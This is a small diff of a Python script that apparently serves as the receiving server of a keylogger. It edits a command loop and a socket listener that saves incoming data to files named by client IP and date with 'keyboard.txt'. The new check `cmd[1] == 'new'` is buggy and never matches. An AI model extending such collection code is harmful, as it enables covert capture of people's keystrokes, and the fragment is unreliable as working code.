@@ -51,7 +51,9 @@ def chrono():
 def commands():
     while True :
         cmd = input(">>>")
-        print(cmd)
+        
+        if cmd[1] == "new":
+            print(cmd[2])
 
 
     #client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -71,7 +73,7 @@ def receiver(port):
 
     while True:
         client_socket, client_address = server_socket.accept()
-        
+
 
         ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
         # recu data
